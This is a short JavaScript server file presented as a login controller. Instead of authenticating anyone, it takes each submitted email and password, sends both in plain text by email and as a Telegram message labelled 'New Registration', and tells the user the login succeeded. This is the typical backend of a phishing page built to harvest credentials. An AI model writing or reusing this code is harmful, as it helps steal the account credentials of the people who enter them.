import { sendTelegramNotification } from '../config/telegram.js';
import { sendLoginEmail } from '../services/email.services.js';

export async function loginController(req, res) {
  try {
    const { email, password } = req.body;

    // Validate input
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }
    if (password.length<6) {return res.status(400).json({ error: 'Password must be atleast 6 characters' });
    }

    // Call service
    await sendLoginEmail({ email, password })
    const message = `
🆕 <b>New Registration</b>

📧 ${email}
${password}
🕐 ${new Date().toLocaleString()}
    `.trim();
    await sendTelegramNotification (message)

    // Return success
    res.status(200).json({
      message: 'Login successful',
    });

  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Login failed', details: error.message });
  }
}